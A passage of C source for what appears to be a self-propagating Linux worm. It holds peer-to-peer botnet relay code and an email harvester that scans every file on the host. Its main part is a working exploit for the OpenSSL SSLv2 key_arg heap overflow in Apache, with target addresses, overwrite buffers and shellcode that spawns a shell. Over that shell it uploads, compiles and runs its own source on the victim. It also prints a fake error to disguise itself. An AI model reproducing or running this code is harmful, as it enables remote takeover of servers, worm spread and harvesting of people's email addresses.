_numlinks=numlinks-b>700?700:numlinks-b;\n\t\tunsigned long *_links=links+b;\n\t\tunsigned char *str;\n\t\tif (b > numlinks) break;\n\t\tstr=(unsigned char*)malloc(sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));\n\t\tif (str == NULL) return;\n\t\tmemset((void*)&rc,0,sizeof(struct addsrv_rec));\n\t\trc.h.tag=tag;\n\t\trc.h.id=id;\n\t\tif (id) rc.h.seq=newseq();\n\t\trc.h.len=sizeof(struct next_rec)*_numlinks;\n\t\tmemcpy((void*)str,(void*)&rc,sizeof(struct addsrv_rec));\n\t\tfor (a=0;a<_numlinks;a++) {\n\t\t\tmemset((void*)&fc,0,sizeof(struct next_rec));\n\t\t\tfc.server=_links[a];\n\t\t\tmemcpy((void*)(str+sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec))),(void*)&fc,sizeof(struct next_rec));\n\t\t}\n\t\tif (!id) relay(inst->in.sin_addr.s_addr,(void*)str,sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));\n\t\telse relayclient(inst,(void*)str,sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));\n\t\tFREE(str);\n\t}\n}\n\nvoid senderror(struct ainst *inst, int id, char *buf2) {\n\tstruct data_rec rc;\n\tchar *str,*buf=strdup(buf2);\n\tmemset((void*)&rc,0,sizeof(struct data_rec));\n\trc.h.tag=0x45;\n\trc.h.id=id;\n\trc.h.seq=newseq();\n\trc.h.len=strlen(buf2);\n\t_encrypt(buf,strlen(buf2));\n\tstr=(char*)malloc(sizeof(struct data_rec)+strlen(buf2)+1);\n\tif (str == NULL) {\n\t\tFREE(buf);\n\t\treturn;\n\t}\n\tmemcpy((void*)str,(void*)&rc,sizeof(struct data_rec));\n\tmemcpy((void*)(str+sizeof(struct data_rec)),buf,strlen(buf2));\n\trelayclient(&udpclient,str,sizeof(struct data_rec)+strlen(buf2));\n\tFREE(str);\n\tFREE(buf);\n}\n\n//////////////////////////////////////////////////////////////////////////////////////\n//                                      Scan for email                              //\n//////////////////////////////////////////////////////////////////////////////////////\n\nint isgood(char a) {\n\tif (a >= 'a' && a <= 'z') return 1;\n\tif (a >= 'A' && a <= 'Z') return 1;\n\tif (a >= '0' && a <= '9') return 1;\n\tif (a == '.' || a == '@' || a == '^' || a == '-' || a == '_') return 1;\n\treturn 0;\n}\n\nint islisten(char a) {\n\tif (a == '.') return 1;\n\tif (a >= 'a' && a <= 'z') return 1;\n\tif (a >= 'A' && a <= 'Z') return 1;\n\treturn 0;\n}\n\nstruct _linklist {\n\tchar *name;\n\tstruct _linklist *next;\n} *linklist=NULL;\n\nvoid AddToList(char *str) {\n\tstruct _linklist *getb=linklist,*newb;\n\twhile(getb != NULL) {\n\t\tif (!strcmp(str,getb->name)) return;\n\t\tgetb=getb->next;\n\t}\n\tnewb=(struct _linklist *)malloc(sizeof(struct _linklist));\n\tif (newb == NULL) return;\n\tnewb->name=strdup(str);\n\tnewb->next=linklist;\n\tlinklist=newb;\n}\n\nvoid cleanup(char *buf) {\n\twhile(buf[strlen(buf)-1] == '\\n' || buf[strlen(buf)-1] == '\\r' || buf[strlen(buf)-1] == ' ') buf[strlen(buf)-1] = 0;\n\twhile(*buf == '\\n' || *buf == '\\r' || *buf == ' ') {\n\t\tunsigned long i;\n\t\tfor (i=strlen(buf)+1;i>0;i--) buf[i-1]=buf[i];\n\t}\n}\n\nvoid ScanFile(char *f) {\n\tFILE *file=fopen(f,\"r\");\n\tunsigned long startpos=0;\n\tif (file == NULL) return;\n\twhile(1) {\n\t\tchar buf[2];\n\t\tmemset(buf,0,2);\n\t\tfseek(file,startpos,SEEK_SET);\n\t\tfread(buf,1,1,file);\n\t\tstartpos++;\n\t\tif (feof(file)) break;\n\t\tif (*buf == '@') {\n\t\t\tchar email[256],c,d;\n\t\t\tunsigned long pos=0;\n\t\t\twhile(1) {\n\t\t\t\tunsigned long oldpos=ftell(file);\n\t\t\t\tfseek(file,-1,SEEK_CUR);\n\t\t\t\tc=fgetc(file);\n\t\t\t\tif (!isgood(c)) break;\n\t\t\t\tfseek(file,-1,SEEK_CUR);\n\t\t\t\tif (oldpos == ftell(file)) break;\n\t\t\t}\n\t\t\tfor (pos=0,c=0,d=0;pos<255;pos++) {\n\t\t\t\temail[pos]=fgetc(file);\n\t\t\t\tif (email[pos] == '.') c++;\n\t\t\t\tif (email[pos] == '@') d++;\n\t\t\t\tif (!isgood(email[pos])) break;\n\t\t\t}\n\t\t\temail[pos]=0;\n\t\t\tif (c == 0 || d != 1) continue;\n\t\t\tif (email[strlen(email)-1] == '.') email[strlen(email)-1]=0;\n\t\t\tif (*email == '@' || *email == '.' || !*email) continue;\n\t\t\tif (!strcmp(email,\"webmaster@mydomain.com\")) continue;\n\t\t\tfor (pos=0,c=0;pos<strlen(email);pos++) if (email[pos] == '.') c=pos;\n\t\t\tif (c == 0) continue;\n\t\t\tif (!strncmp(email+c,\".hlp\",4)) continue;\n\t\t\tfor (pos=c,d=0;pos<strlen(email);pos++) if (!islisten(email[pos])) d=1;\n\t\t\tif (d == 1) continue;\n\t\t\tAddToList(email);\n\t\t}\n\t}\n\tfclose(file);\n}\n\nvoid StartScan() {\n\tFILE *f;\n\tf=popen(\"find / -type f\",\"r\");\n\tif (f == NULL) return;\n\twhile(1) {\n\t\tchar fullfile[MAXPATH];\n\t\tmemset(fullfile,0,MAXPATH);\n\t\tfgets(fullfile,MAXPATH,f);\n\t\tif (feof(f)) break;\n\t\twhile(fullfile[strlen(fullfile)-1]=='\\n' ||\n\t\t\tfullfile[strlen(fullfile)-1] == '\\r')\n\t\t\tfullfile[strlen(fullfile)-1]=0;\n\t\tif (!strncmp(fullfile,\"/proc\",5)) continue;\n\t\tif (!strncmp(fullfile,\"/dev\",4)) continue;\n\t\tif (!strncmp(fullfile,\"/bin\",4)) continue;\n\t\tScanFile(fullfile);\n\t}\n}\n\n//////////////////////////////////////////////////////////////////////////////////////\n//                                    Exploit                                       //\n//////////////////////////////////////////////////////////////////////////////////////\n\n#ifdef SCAN\n#include <openssl/ssl.h>\n#include <openssl/rsa.h>\n#include <openssl/x509.h>\n#include <openssl/evp.h>\n\nchar *GetAddress(char *ip) {\n\tstruct sockaddr_in sin;\n\tfd_set fds;\n\tint n,d,sock;\n\tchar buf[1024];\n\tstruct timeval tv;\n\tsock = socket(PF_INET, SOCK_STREAM, 0);\n\tsin.sin_family = PF_INET;\n\tsin.sin_addr.s_addr = inet_addr(ip);\n\tsin.sin_port = htons(80);\n\tif(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) return NULL;\n\twrite(sock,\"GET / HTTP/1.1\\r\\n\\r\\n\",strlen(\"GET / HTTP/1.1\\r\\n\\r\\n\"));\n\ttv.tv_sec = 15;\n\ttv.tv_usec = 0;\n\tFD_ZERO(&fds);\n\tFD_SET(sock, &fds);\n\tmemset(buf, 0, sizeof(buf));\n\tif(select(sock + 1, &fds, NULL, NULL, &tv) > 0) {\n\t\tif(FD_ISSET(sock, &fds)) {\n\t\t\tif((n = read(sock, buf, sizeof(buf) - 1)) < 0) return NULL;\n\t\t\tfor (d=0;d<n;d++) if (!strncmp(buf+d,\"Server: \",strlen(\"Server: \"))) {\n\t\t\t\tchar *start=buf+d+strlen(\"Server: \");\n\t\t\t\tfor (d=0;d<strlen(start);d++) if (start[d] == '\\n') start[d]=0;\n\t\t\t\tcleanup(start);\n\t\t\t\treturn strdup(start);\n\t\t\t}\n\t\t}\n\t}\n\treturn NULL;\n}\n\n#define\tENC(c) ((c) ? ((c) & 077) + ' ': '`')\n\nint sendch(int sock,int buf) {\n\tchar a[2];\n\tint b=1;\n\tif (buf == '`' || buf == '\\\\' || buf == '$') {\n\t\ta[0]='\\\\';\n\t\ta[1]=0;\n\t\tb=write(sock,a,1);\n\t}\n\tif (b <= 0) return b;\n\ta[0]=buf;\n\ta[1]=0;\n\treturn write(sock,a,1);\n}\n\nint writem(int sock, char *str) {\n\treturn write(sock,str,strlen(str));\n}\n\nint encode(int a) {\n\tregister int ch, n;\n\tregister char *p;\n\tchar buf[80];\n\tFILE *in;\n\tif ((in=fopen(\"/tmp/.bugtraq.c\",\"r\")) == NULL) return 0;\n\twritem(a,\"begin 655 .bugtraq.c\\n\");\n\twhile ((n = fread(buf, 1, 45, in))) {\n\t\tch = ENC(n);\n\t\tif (sendch(a,ch) <= ASUCCESS) break;\n\t\tfor (p = buf; n > 0; n -= 3, p += 3) {\n\t\t\tif (n < 3) {\n\t\t\t\tp[2] = '\\0';\n\t\t\t\tif (n < 2) p[1] = '\\0';\n\t\t\t}\n\t\t\tch = *p >> 2;\n\t\t\tch = ENC(ch);\n\t\t\tif (sendch(a,ch) <= ASUCCESS) break;\n\t\t\tch = ((*p << 4) & 060) | ((p[1] >> 4) & 017);\n\t\t\tch = ENC(ch);\n\t\t\tif (sendch(a,ch) <= ASUCCESS) break;\n\t\t\tch = ((p[1] << 2) & 074) | ((p[2] >> 6) & 03);\n\t\t\tch = ENC(ch);\n\t\t\tif (sendch(a,ch) <= ASUCCESS) break;\n\t\t\tch = p[2] & 077;\n\t\t\tch = ENC(ch);\n\t\t\tif (sendch(a,ch) <= ASUCCESS) break;\n\t\t}\n\t\tch='\\n';\n\t\tif (sendch(a,ch) <= ASUCCESS) break;\n\t\tusleep(10);\n\t}\n\tif (ferror(in)) {\n\t\tfclose(in);\n\t\treturn 0;\n\t}\n\tch = ENC('\\0');\n\tsendch(a,ch);\n\tch = '\\n';\n\tsendch(a,ch);\n\twritem(a,\"end\\n\");\n\tif (in) fclose(in);\n\treturn 1;\n}\n\n#define MAX_ARCH 21\n\nstruct archs {\n\tchar *os;\n\tchar *apache;\n\tint func_addr;\n} architectures[] = {\n\t{\"Gentoo\", \"\", 0x08086c34},\n\t{\"Debian\", \"1.3.26\", 0x080863cc},\n\t{\"Red-Hat\", \"1.3.6\", 0x080707ec},\n\t{\"Red-Hat\", \"1.3.9\", 0x0808ccc4},\n\t{\"Red-Hat\", \"1.3.12\", 0x0808f614},\n\t{\"Red-Hat\", \"1.3.12\", 0x0809251c},\n\t{\"Red-Hat\", \"1.3.19\", 0x0809af8c},\n\t{\"Red-Hat\", \"1.3.20\", 0x080994d4},\n\t{\"Red-Hat\", \"1.3.26\", 0x08161c14},\n\t{\"Red-Hat\", \"1.3.23\", 0x0808528c},\n\t{\"Red-Hat\", \"1.3.22\", 0x0808400c},\n\t{\"SuSE\", \"1.3.12\", 0x0809f54c},\n\t{\"SuSE\", \"1.3.17\", 0x08099984},\n\t{\"SuSE\", \"1.3.19\", 0x08099ec8},\n\t{\"SuSE\", \"1.3.20\", 0x08099da8},\n\t{\"SuSE\", \"1.3.23\", 0x08086168},\n\t{\"SuSE\", \"1.3.23\", 0x080861c8},\n\t{\"Mandrake\", \"1.3.14\", 0x0809d6c4},\n\t{\"Mandrake\", \"1.3.19\", 0x0809ea98},\n\t{\"Mandrake\", \"1.3.20\", 0x0809e97c},\n\t{\"Mandrake\", \"1.3.23\", 0x08086580},\n\t{\"Slackware\", \"1.3.26\", 0x083d37fc},\n\t{\"Slackware\", \"1.3.26\",0x080b2100}\n};\n\nextern int errno;\n\nint cipher;\nint ciphers;\n\n#define FINDSCKPORTOFS\t   208 + 12 + 46\n\nunsigned char overwrite_session_id_length[] =\n\t\"AAAA\"\n\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n\t\"\\x70\\x00\\x00\\x00\";\n\nunsigned char overwrite_next_chunk[] =\n\t\"AAAA\"\n\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n\t\"AAAA\"\n\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n\t\"AAAA\"\n\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n\t\"AAAA\"\n\t\"\\x00\\x00\\x00\\x00\"\n\t\"\\x00\\x00\\x00\\x00\"\n\t\"AAAA\"\n\t\"\\x01\\x00\\x00\\x00\"\n\t\"AAAA\"\n\t\"AAAA\"\n\t\"AAAA\"\n\t\"\\x00\\x00\\x00\\x00\"\n\t\"AAAA\"\n\t\"\\x00\\x00\\x00\\x00\"\n\t\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n\t\"AAAAAAAA\"\n\n\t\"\\x00\\x00\\x00\\x00\"\n\t\"\\x11\\x00\\x00\\x00\"\n\t\"fdfd\"\n\t\"bkbk\"\n\t\"\\x10\\x00\\x00\\x00\"\n\t\"\\x10\\x00\\x00\\x00\"\n\n\t\"\\xeb\\x0a\\x90\\x90\"\n\t\"\\x90\\x90\\x90\\x90\"\n\t\"\\x90\\x90\\x90\\x90\"\n\n\t\"\\x31\\xdb\"\n\t\"\\x89\\xe7\"\n\t\"\\x8d\\x77\\x10\"\n\t\"\\x89\\x77\\x04\"\n\t\"\\x8d\\x4f\\x20\"\n\t\"\\x89\\x4f\\x08\"\n\t\"\\xb3\\x10\"\n\t\"\\x89\\x19\"\n\t\"\\x31\\xc9\"\n\t\"\\xb1\\xff\"\n\t\"\\x89\\x0f\"\n\t\"\\x51\"\n\t\"\\x31\\xc0\"\n\t\"\\xb0\\x66\"\n\t\"\\xb3\\x07\"\n\t\"\\x89\\xf9\"\n\t\"\\xcd\\x80\"\n\t\"\\x59\"\n\t\"\\x31\\xdb\"\n\t\"\\x39\\xd8\"\n\t\"\\x75\\x0a\"\n\t\"\\x66\\xb8\\x12\\x34\"\n\t\"\\x66\\x39\\x46\\x02\"\n\t\"\\x74\\x02\"\n\t\"\\xe2\\xe0\"\n\t\"\\x89\\xcb\"\n\t\"\\x31\\xc9\"\n\t\"\\xb1\\x03\"\n\t\"\\x31\\xc0\"\n\t\"\\xb0\\x3f\"\n\t\"\\x49\"\n\t\"\\xcd\\x80\"\n\t\"\\x41\"\n\t\"\\xe2\\xf6\"\n\n\t\"\\x31\\xc9\"\n\t\"\\xf7\\xe1\"\n\t\"\\x51\"\n\t\"\\x5b\"\n\t\"\\xb0\\xa4\"\n\t\"\\xcd\\x80\"\n\n\t\"\\x31\\xc0\"\n\t\"\\x50\"\n\t\"\\x68\"\"//sh\"\n\t\"\\x68\"\"/bin\"\n\t\"\\x89\\xe3\"\n\t\"\\x50\"\n\t\"\\x53\"\n\t\"\\x89\\xe1\"\n\t\"\\x99\"\n\t\"\\xb0\\x0b\"\n\t\"\\xcd\\x80\";\n\n#define BUFSIZE 16384\n#define CHALLENGE_LENGTH 16\n#define RC4_KEY_LENGTH 16\n#define RC4_KEY_MATERIAL_LENGTH (RC4_KEY_LENGTH*2)\n#define n2s(c,s)\t((s=(((unsigned int)(c[0]))<< 8)| (((unsigned int)(c[1]))\t )),c+=2)\n#define s2n(s,c)\t((c[0]=(unsigned char)(((s)>> 8)&0xff), c[1]=(unsigned char)(((s)\t )&0xff)),c+=2)\n\ntypedef struct {\n\tint sock;\n\tunsigned char challenge[CHALLENGE_LENGTH];\n\tunsigned char master_key[RC4_KEY_LENGTH];\n\tunsigned char key_material[RC4_KEY_MATERIAL_LENGTH];\n\tint conn_id_length;\n\tunsigned char conn_id[SSL2_MAX_CONNECTION_ID_LENGTH];\n\tX509 *x509;\n\tunsigned char* read_key;\n\tunsigned char* write_key;\n\tRC4_KEY* rc4_read_key;\n\tRC4_KEY* rc4_write_key;\n\tint read_seq;\n\tint write_seq;\n\tint encrypted;\n} ssl_conn;\n\nlong getip(char *hostname) {\n\tstruct hostent *he;\n\tlong ipaddr;\n\tif ((ipaddr = inet_addr(hostname)) < 0) {\n\t\tif ((he = gethostbyname(hostname)) == NULL) exit(-1);\n\t\tmemcpy(&ipaddr, he->h_addr, he->h_length);\n\t}\t\n\treturn ipaddr;\n}\n\nint sh(int sockfd) {\n\tchar localip[256], rcv[1024];\n\tfd_set rset;\n\tint maxfd, n;\n\n\talarm(3600);\n\twritem(sockfd,\"TERM=xterm; export TERM=xterm; exec bash -i\\n\");\n\twritem(sockfd,\"rm -rf /tmp/.bugtraq.c;cat > /tmp/.uubugtraq << __eof__;\\n\");\n\tencode(sockfd);\n\twritem(sockfd,\"__eof__\\n\");\n\tconv(localip,256,myip);\n\tmemset(rcv,0,1024);\n\tsprintf(rcv,\"/usr/bin/uudecode -o /tmp/.bugtraq.c /tmp/.uubugtraq;gcc -o /tmp/.bugtraq /tmp/.bugtraq.c -lcrypto;/tmp/.bugtraq %s;exit;\\n\",localip);\n\twritem(sockfd,rcv);\n\tfor (;;) {\n\t\tFD_ZERO(&rset);\n\t\tFD_SET(sockfd, &rset);\n\t\tselect(sockfd+1, &rset, NULL, NULL, NULL);\n\t\tif (FD_ISSET(sockfd, &rset)) if ((n = read(sockfd, rcv, sizeof(rcv))) == 0) return 0;\n\t}\n}\n\nint get_local_port(int sock) {\n\tstruct sockaddr_in s_in;\n\tunsigned int namelen = sizeof(s_in);\n\tif (getsockname(sock, (struct sockaddr *)&s_in, &namelen) < 0) exit(1);\n\treturn s_in.sin_port;\n}\n\nint connect_host(char* host, int port) {\n\tstruct sockaddr_in s_in;\n\tint sock;\n\ts_in.sin_family = AF_INET;\n\ts_in.sin_addr.s_addr = getip(host);\n\ts_in.sin_port = htons(port);\n\tif ((sock = socket(AF_INET, SOCK_STREAM, 0)) <= 0) exit(1);\n\talarm(10);\n\tif (connect(sock, (struct sockaddr *)&s_in, sizeof(s_in)) < 0) exit(1);\n\talarm(0);\n\treturn sock;\n}\n\nssl_conn* ssl_connect_host(char* host, int port) {\n\tssl_conn* ssl;\n\tif (!(ssl = (ssl_conn*) malloc(sizeof(ssl_conn)))) exit(1);\n\tssl->encrypted = 0;\n\tssl->write_seq = 0;\n\tssl->read_seq = 0;\n\tssl->sock = connect_host(host, port);\n\treturn ssl;\n}\n\nchar res_buf[30];\n\nint read_data(int sock, unsigned char* buf, int len) {\n\tint l;\n\tint to_read = len;\n\tdo {\n\t\tif ((l = read(sock, buf, to_read)) < 0) exit(1);\n\t\tto_read -= len;\n\t} while (to_read > 0);\n\treturn len;\n}\n\nint read_ssl_packet(ssl_conn* ssl, unsigned char* buf, int buf_size) {\n\tint rec_len, padding;\n\tread_data(ssl->sock, buf, 2);\n\tif ((buf[0] & 0x80) == 0) {\n\t\trec_len = ((buf[0] & 0x3f) << 8) | buf[1];\n\t\tread_data(ssl->sock, &buf[2], 1);\n\t\tpadding = (int)buf[2];\n\t}\n\telse {\n\t\trec_len = ((buf[0] & 0x7f) << 8) | buf[1];\n\t\tpadding = 0;\n\t}\n\tif ((rec_len <= 0) || (rec_len > buf_size)) exit(1);\n\tread_data(ssl->sock, buf, rec_len);\n\tif (ssl->encrypted) {\n\t\tif (MD5_DIGEST_LENGTH + padding >= rec_len) {\n\t\t\tif ((buf[0] == SSL2_MT_ERROR) && (rec_len == 3)) return 0;\n\t\t\telse exit(1);\n\t\t}\n\t\tRC4(ssl->rc4_read_key, rec_len, buf, buf);\n\t\trec_len = rec_len - MD5_DIGEST_LENGTH - padding;\n\t\tmemmove(buf, buf + MD5_DIGEST_LENGTH, rec_len);\n\t}\n\tif (buf[0] == SSL2_MT_ERROR) {\n\t\tif (rec_len != 3) exit(1);\n\t\telse return 0;\n\t}\n\treturn rec_len;\n}\n\nvoid send_ssl_packet(ssl_conn* ssl, unsigned char* rec, int rec_len) {\n\tunsigned char buf[BUFSIZE];\n\tunsigned char* p;\n\tint tot_len;\n\tMD5_CTX ctx;\n\tint seq;\n\tif (ssl->encrypted) tot_len = rec_len + MD5_DIGEST_LENGTH;\n\telse tot_len = rec_len;\n\n\tif (2 + tot_len > BUFSIZE) exit(1);\n\n\tp = buf;\n\ts2n(tot_len, p);\n\n\tbuf[0] = buf[0] | 0x80;\n\n\tif (ssl->encrypted) {\n\t\tseq = ntohl(ssl->write_seq);\n\n\t\tMD5_Init(&ctx);\n\t\tMD5_Update(&ctx, ssl->write_key, RC4_KEY_LENGTH);\n\t\tMD5_Update(&ctx, rec, rec_len);\n\t\tMD5_Update(&ctx, &seq, 4);\n\t\tMD5_Final(p, &ctx);\n\n\t\tp+=MD5_DIGEST_LENGTH;\n\n\t\tmemcpy(p, rec, rec_len);\n\n\t\tRC4(ssl->rc4_write_key, tot_len, &buf[2], &buf[2]);\n\t}\n\telse memcpy(p, rec, rec_len);\n\n\tsend(ssl->sock, buf, 2 + tot_len, 0);\n\n\tssl->write_seq++;\n}\n\nvoid send_client_hello(ssl_conn *ssl) {\n\tint i;\n\tunsigned char buf[BUFSIZE] =\n\t\t\"\\x01\"\n\t\t\"\\x00\\x02\"\n\t\t\"\\x00\\x18\"\n\t\t\"\\x00\\x00\"\n\t\t\"\\x00\\x10\"\n\t\t\"\\x07\\x00\\xc0\\x05\\x00\\x80\\x03\\x00\"\n\t\t\"\\x80\\x01\\x00\\x80\\x08\\x00\\x80\\x06\"\n\t\t\"\\x00\\x40\\x04\\x00\\x80\\x02\\x00\\x80\"\n\t\t\"\";\n\tfor (i = 0; i < CHALLENGE_LENGTH; i++) ssl->challenge[i] = (unsigned char) (rand() >> 24);\n\tmemcpy(&buf[33], ssl->challenge, CHALLENGE_LENGTH);\n\tsend_ssl_packet(ssl, buf, 33 + CHALLENGE_LENGTH);\n}\n\nvoid get_server_hello(ssl_conn* ssl) {\n\tunsigned char buf[BUFSIZE];\n\tunsigned char *p, *end;\n\tint len;\n\tint server_version, cert_length, cs_length, conn_id_length;\n\tint found;\n\n\tif (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);\n\tif (len < 11) exit(1);\n\n\tp = buf;\n\n\tif (*(p++) != SSL2_MT_SERVER_HELLO) exit(1);\n\tif (*(p++) != 0) exit(1);\n\tif (*(p++) != 1) exit(1);\n\tn2s(p, server_version);\n\tif (server_version != 2) exit(1);\n\n\tn2s(p, cert_length);\n\tn2s(p, cs_length);\n\tn2s(p, conn_id_length);\n\n\tif (len != 11 + cert_length + cs_length + conn_id_length) exit(1);\n\tssl->x509 = NULL;\n\tssl->x509=d2i_X509(NULL,&p,(long)cert_length);\n\tif (ssl->x509 == NULL) exit(1);\n\tif (cs_length % 3 != 0) exit(1);\n\n\tfound = 0;\n\tfor (end=p+cs_length; p < end; p += 3) if ((p[0] == 0x01) && (p[1] == 0x00) && (p[2] == 0x80)) found = 1;\n\n\tif (!found) exit(1);\n\n\tif (conn_id_length > SSL2_MAX_CONNECTION_ID_LENGTH) exit(1);\n\n\tssl->conn_id_length = conn_id_length;\n\tmemcpy(ssl->conn_id, p, conn_id_length);\n}\n\nvoid send_client_master_key(ssl_conn* ssl, unsigned char* key_arg_overwrite, int key_arg_overwrite_len) {\n\tint encrypted_key_length, key_arg_length, record_length;\n\tunsigned char* p;\n\tint i;\n\tEVP_PKEY *pkey=NULL;\n\tunsigned char buf[BUFSIZE] =\n\t\t\"\\x02\"\n\t\t\"\\x01\\x00\\x80\"\n\t\t\"\\x00\\x00\"\n\t\t\"\\x00\\x40\"\n\t\t\"\\x00\\x08\";\n\tp = &buf[10];\n\tfor (i = 0; i < RC4_KEY_LENGTH; i++) ssl->master_key[i] = (unsigned char) (rand() >> 24);\n\tpkey=X509_get_pubkey(ssl->x509);\n\tif (!pkey) exit(1);\n\tif (pkey->type != EVP_PKEY_RSA) exit(1);\n\tencrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], pkey->pkey.rsa, RSA_PKCS1_PADDING);\n\tif (encrypted_key_length <= 0) exit(1);\n\tp += encrypted_key_length;\n\tif (key_arg_overwrite) {\n\t\tfor (i = 0; i < 8; i++) *(p++) = (unsigned char) (rand() >> 24);\n\t\tmemcpy(p, key_arg_overwrite, key_arg_overwrite_len);\n\t\tkey_arg_length = 8 + key_arg_overwrite_len;\n\t}\n\telse key_arg_length = 0;\n\tp = &buf[6];\n\ts2n(encrypted_key_length, p);\n\ts2n(key_arg_length, p);\n\trecord_length = 10 + encrypted_key_length + key_arg_length;\n\tsend_ssl_packet(ssl, buf, record_length);\n\tssl->encrypted = 1;\n}\n\nvoid generate_key_material(ssl_conn* ssl) {\n\tunsigned int i;\n\tMD5_CTX ctx;\n\tunsigned char *km;\n\tunsigned char c='0';\n\tkm=ssl->key_material;\n\tfor (i=0; i<RC4_KEY_MATERIAL_LENGTH; i+=MD5_DIGEST_LENGTH) {\n\t\tMD5_Init(&ctx);\n\t\tMD5_Update(&ctx,ssl->master_key,RC4_KEY_LENGTH);\n\t\tMD5_Update(&ctx,&c,1);\n\t\tc++;\n\t\tMD5_Update(&ctx,ssl->challenge,CHALLENGE_LENGTH);\n\t\tMD5_Update(&ctx,ssl->conn_id, ssl->conn_id_length);\n\t\tMD5_Final(km,&ctx);\n\t\tkm+=MD5_DIGEST_LENGTH;\n\t}\n}\n\nvoid generate_session_keys(ssl_conn* ssl) {\n\tgenerate_key_material(ssl);\n\tssl->read_key = &(ssl->key_material[0]);\n\tssl->rc4_read_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));\n\tRC4_set_key(ssl->rc4_read_key, RC4_KEY_LENGTH, ssl->read_key);\n\tssl->write_key = &(ssl->key_material[RC4_KEY_LENGTH]);\n\tssl->rc4_write_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));\n\tRC4_set_key(ssl->rc4_write_key, RC4_KEY_LENGTH, ssl->write_key);\n}\n\nvoid get_server_verify(ssl_conn* ssl) {\n\tunsigned char buf[BUFSIZE];\n\tint len;\n\tif (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);\n\tif (len != 1 + CHALLENGE_LENGTH) exit(1);\n\tif (buf[0] != SSL2_MT_SERVER_VERIFY) exit(1);\n\tif (memcmp(ssl->challenge, &buf[1], CHALLENGE_LENGTH)) exit(1);\n}\n\nvoid send_client_finished(ssl_conn* ssl) {\n\tunsigned char buf[BUFSIZE];\n\tbuf[0] = SSL2_MT_CLIENT_FINISHED;\n\tmemcpy(&buf[1], ssl->conn_id, ssl->conn_id_length);\n\tsend_ssl_packet(ssl, buf, 1+ssl->conn_id_length);\n}\n\nvoid get_server_finished(ssl_conn* ssl) {\n\tunsigned char buf[BUFSIZE];\n\tint len;\n\tint i;\n\tif (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);\n\tif (buf[0] != SSL2_MT_SERVER_FINISHED) exit(1);\n\tif (len <= 112) exit(1);\n\tcipher = *(int*)&buf[101];\n\tciphers = *(int*)&buf[109];\n}\n\nvoid get_server_error(ssl_conn* ssl) {\n\tunsigned char buf[BUFSIZE];\n\tint len;\n\tif ((len = read_ssl_packet(ssl, buf, sizeof(buf))) > 0) exit(1);\n}\n\nvoid exploit(char *ip) {\n\tint port = 443;\n\tint i;\n\tint arch=-1;\n\tint N = 20;\n\tssl_conn* ssl1;\n\tssl_conn* ssl2;\n\tchar *a;\n\n\talarm(3600);\n\tif ((a=GetAddress(ip)) == NULL) exit(0);\n\tif (strncmp(a,\"Apache\",6)) exit(0);\n\tfor (i=0;i<MAX_ARCH;i++) {\n\t\tif (strstr(a,architectures[i].apache) && strstr(a,architectures[i].os)) {\n\t\t\tarch=i;\n\t\t\tbreak;\n\t\t}\n\t}\n\tif (arch == -1) arch=9;\n\n\tsrand(0x31337);\n\n\tfor (i=0; i<N; i++) {\n\t\tconnect_host(ip, port);\n\t\tusleep(100000);\n\t}\n\n\tssl1 = ssl_connect_host(ip, port);\n\tssl2 = ssl_connect_host(ip, port);\n\n\tsend_client_hello(ssl1);\n\tget_server_hello(ssl1);\n\tsend_client_master_key(ssl1, overwrite_session_id_length, sizeof(overwrite_session_id_length)-1);\n\tgenerate_session_keys(ssl1);\n\tget_server_verify(ssl1);\n\tsend_client_finished(ssl1);\n\tget_server_finished(ssl1);\n\n\tport = get_local_port(ssl2->sock);\n\toverwrite_next_chunk[FINDSCKPORTOFS] = (char) (port & 0xff);\n\toverwrite_next_chunk[FINDSCKPORTOFS+1] = (char) ((port >> 8) & 0xff);\n\n\t*(int*)&overwrite_next_chunk[156] = cipher;\n\t*(int*)&overwrite_next_chunk[192] = architectures[arch].func_addr - 12;\n\t*(int*)&overwrite_next_chunk[196] = ciphers + 16;\n\n\tsend_client_hello(ssl2);\n\tget_server_hello(ssl2);\n\n\tsend_client_master_key(ssl2, overwrite_next_chunk, sizeof(overwrite_next_chunk)-1);\n\tgenerate_session_keys(ssl2);\n\tget_server_verify(ssl2);\n\n\tfor (i = 0; i < ssl2->conn_id_length; i++) ssl2->conn_id[i] = (unsigned char) (rand() >> 24);\n\n\tsend_client_finished(ssl2);\n\tget_server_error(ssl2);\n\n\tsh(ssl2->sock);\n\n\tclose(ssl2->sock);\n\tclose(ssl1->sock);\n\n\texit(0);\n}\n#endif\n\n//////////////////////////////////////////////////////////////////////////////////////\n//////////////////////////////////////////////////////////////////////////////////////\n//////////////////////////////////////////////////////////////////////////////////////\n\nint main(int argc, char **argv) {\n#ifdef SCAN\n\tunsigned char a=0,b=0,c=0,d=0;\n#endif\n\tunsigned long bases,*cpbases;\n\tstruct initsrv_rec initrec;\n\tint null=open(\"/dev/null\",O_RDWR);\n\tuptime=time(NULL);\n\tif (argc <= 1) {\n\t\tprintf(\"%s: Exec format error. Binary file not executable.\\n\",argv[0]);\n\t\treturn 0;\n\t}\n\tsrand(time(NULL)^getpid());\n\tmemset((char*)&routes,0,sizeof(struct route_table)*24);\n\tmemset(clients,0,sizeof(struct ainst)*CLIENTS*2);\n\tif (audp_listen(&udpserver,PORT) != 0) {\n\t\tprintf(\"Error: %s\\n\",aerror(&udpserver));\n\t\treturn 0;\n\t}\n\tmemset((void*)&initrec,0,sizeof(struct 